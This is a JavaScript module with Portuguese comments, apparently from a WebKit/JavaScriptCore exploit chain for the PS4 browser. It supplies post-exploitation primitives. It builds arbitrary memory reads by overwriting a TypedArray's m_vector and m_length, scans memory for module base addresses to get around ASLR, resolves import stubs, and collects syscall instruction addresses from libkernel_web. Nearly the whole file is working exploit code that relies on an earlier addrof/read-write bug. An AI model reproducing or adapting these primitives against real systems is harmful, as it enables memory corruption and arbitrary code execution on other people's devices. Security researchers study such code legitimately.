//module/memtools.mjs (ATUALIZADO)

// Este módulo contém utilitários que dependem da execução inicial do exploit.

import { Int } from './int64.mjs'; // Importa Int para manipulação de inteiros de 64 bits
import { mem } from './mem.mjs'; // Importa a instância global de Memory
import { align } from './utils.mjs'; // Importa a função align de utils.mjs
import { JSC_OFFSETS } from '../config.mjs'; // ADICIONADO: Importa do config consolidado
import { BufferView } from './rw.mjs'; // Importa BufferView para manipulação de buffers
import { View1 } from './view.mjs'; // Importa View1 para manipulação de arrays de 8 bits

// Cria um ArrayBuffer cujo conteúdo é copiado de um endereço de memória arbitrária.
export function make_buffer(addr, size) {
    // Para criar um OversizeTypedArray, requisita-se um Uint8Array com número de elementos
    // maior que fastSizeLimit (1000).
    // Não se usa FastTypedArray, pois seu m_vector é visitado pelo GC,
    // e mudanças temporárias podem causar crashes se o endereço não for do heap JS.
    const u = new Uint8Array(1001); // Cria um TypedArray grande o suficiente.
    const u_addr = mem.addrof(u); // Obtém o endereço do TypedArray no heap JS.

    // Salva o endereço original do vetor e o tamanho.
    const old_addr = u_addr.read64(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET);
    const old_size = u_addr.read32(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET);

    // Sobrescreve o m_vector e m_length do TypedArray para apontar para o endereço e tamanho desejados.
    u_addr.write64(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET, addr);
    u_addr.write32(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, size);

    const copy = new Uint8Array(u.length); // Cria uma cópia do conteúdo do TypedArray.
    copy.set(u); // Copia os dados.

    // Views com m_mode < WastefulTypedArray não possuem um objeto ArrayBuffer associado.
    // Ao solicitar 'view.buffer', a view é convertida em WastefulTypedArray e um ArrayBuffer é criado.
    // Isso é feito chamando slowDownAndWasteMemory().
    // Não se pode usar slowDownAndWasteMemory() em 'u', pois isso criaria um JSC::ArrayBufferContents
    // com 'm_data' apontando para 'addr', e 'WTF::fastFree()' seria chamado em 'm_data' na morte do ArrayBuffer,
    // podendo causar crash se 'm_data' não for do heap fastMalloc.
    const res = copy.buffer; // O ArrayBuffer resultante contém os dados do endereço arbitrário.

    // Restaura o m_vector e m_length do TypedArray original.
    u_addr.write64(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET, old_addr);
    u_addr.write32(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, old_size);

    return res;
}

// Verifica um "magic" (sequência de bytes esperada) em um endereço.
function check_magic_at(p, is_text) {
    // Sequência de bytes que provavelmente aparece no offset 0 de um segmento .text.
    const text_magic = [
        new Int(0xe5894855, 0x56415741),
        new Int(0x54415541, 0x8d485053),
    ];

    // O "magic" de .data é uma porção do segmento PT_SCE_MODULE_PARAM.
    // Magic de .data de 8.00 e 8.03.
    const data_magic = [
        new Int(0x20),
        new Int(0x3c13f4bf, 0x2),
    ];

    const magic = is_text ? text_magic : data_magic;
    const value = [p.read64(0), p.read64(8)]; // Lê os 16 primeiros bytes.

    return value[0].eq(magic[0]) && value[1].eq(magic[1]);
}

// Encontra o endereço base de um segmento: .text ou .data.
// Usado no PS4 para localizar endereços base de módulos.
// Módulos são provavelmente separados por páginas não mapeadas devido ao ASLR.
export function find_base(addr, is_text, is_back) {
    const page_size = 16 * 1024; // 16KB
    // Alinha ao tamanho da página.
    addr = align(addr, page_size);
    const offset = (is_back ? -1 : 1) * page_size; // Define o passo da busca.
    while (true) { // Loop de busca.
        if (check_magic_at(addr, is_text)) { // Verifica o magic no endereço atual.
            break; // Se encontrado, sai do loop.
        }
        addr = addr.add(offset); // Move para o próximo endereço.
    }
    return addr;
}

// Obtém o endereço do buffer subjacente de um JSC::JSArrayBufferView.
export function get_view_vector(view) {
    if (!ArrayBuffer.isView(view)) { // Verifica se é uma view de ArrayBuffer.
        throw TypeError(`object not a JSC::JSArrayBufferView: ${view}`);
    }
    // Retorna o endereço do m_vector do JSC::JSArrayBufferView.
    return mem.addrof(view).readp(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET);
}

// Resolve o endereço de uma função importada através do seu stub de importação.
export function resolve_import(import_addr) {
    // Verifica se a instrução no endereço de importação é 'jmp qword [rip + X]'.
    if (import_addr.read16(0) !== 0x25ff) {
        throw Error(
            `instruction at ${import_addr} is not of the form: jmp qword`
            + ' [rip + X]');
    }
    // Calcula o deslocamento (displacement) da instrução.
    const disp = import_addr.read32(2);
    // O valor do rIP usado por "jmp [rip + X]" é o rIP da próxima instrução.
    // Portanto, o endereço real é [rip + X + sizeof(jmp_insn)], onde sizeof(jmp_insn) é 6.
    const offset = (disp | 0) + 6;
    // Lê o endereço da função real a partir do offset calculado.
    const function_addr = import_addr.readp(offset);

    return function_addr;
}

// Inicializa um array de syscalls com seus endereços correspondentes.
export function init_syscall_array(
    syscall_array,
    libkernel_web_base,
    max_search_size,
) {
    if (!Number.isInteger(max_search_size)) {
        throw TypeError(
            `max_search_size is not a integer: ${max_search_size}`);
    }
    if (max_search_size < 0) {
        throw Error(`max_search_size is less than 0: ${max_search_size}`);
    }

    // Cria um buffer a partir da base da libkernel_web para busca.
    const libkernel_web_buffer = make_buffer(
        libkernel_web_base,
        max_search_size,
    );
    const kbuf = new BufferView(libkernel_web_buffer);

    // Busca a string 'rdlo' na seção .rodata da libkernel_web para determinar o tamanho da seção .text.
    let text_size = 0;
    let found = false;
    for (let i = 0; i < max_search_size; i++) {
        // Verifica a sequência de bytes 'rdlo'.
        if (kbuf[i] === 0x72
            && kbuf[i + 1] === 0x64
            && kbuf[i + 2] === 0x6c
            && kbuf[i + 3] === 0x6f
        ) {
            text_size = i;
            found = true;
            break;
        }
    }
    if (!found) {
        throw Error(
            '"rdlo" string not found in libkernel_web, base address:'
            + ` ${libkernel_web_base}`);
    }

    // Busca a sequência de instruções de uma syscall padrão:
    // mov rax, X
    // mov r10, rcx
    // syscall
    for (let i = 0; i < text_size; i++) {
        if (kbuf[i] === 0x48
            && kbuf[i + 1] === 0xc7
            && kbuf[i + 2] === 0xc0
            && kbuf[i + 7] === 0x49
            && kbuf[i + 8] === 0x89
            && kbuf[i + 9] === 0xca
            && kbuf[i + 10] === 0x0f
            && kbuf[i + 11] === 0x05
        ) {
            const syscall_num = kbuf.read32(i + 3); // Extrai o número da syscall.
            // Armazena o endereço da syscall no array.
            syscall_array[syscall_num] = libkernel_web_base.add(i);
            i += 11; // Pula a sequência de instruções da syscall.
        }
    }
}

// Cria um array de caracteres estilo C (terminado em nulo).
export function cstr(str) {
    str += '\0'; // Adiciona o terminador nulo.
    // Cria uma View1 (Uint8Array) a partir da string, mapeando code points.
    return View1.from(str, c => c.codePointAt(0));
}

// Re-exporta jstr de utils.mjs, pois é comumente usado com cstr().
export { jstr } from './utils.mjs';
